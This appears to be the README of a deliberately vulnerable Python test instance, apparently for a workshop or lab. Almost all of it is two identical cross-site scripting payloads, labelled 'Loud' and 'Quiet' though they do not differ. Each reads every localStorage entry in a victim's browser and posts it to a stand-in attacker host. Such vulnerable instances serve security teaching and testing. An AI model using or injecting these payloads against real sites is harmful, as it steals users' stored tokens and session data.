# whathestack2024-vuln-python
Python vulnerable instance for testing

Loud Attack command:
"><script>(function(){var d={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);d[k]=localStorage.getItem(k);}alert('Local Storage Data: '+JSON.stringify(d));fetch('https://attacker-server.com/receive-data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});})();</script>

Quiet Attack command:
"><script>(function(){var d={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);d[k]=localStorage.getItem(k);}alert('Local Storage Data: '+JSON.stringify(d));fetch('https://attacker-server.com/receive-data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});})();</script>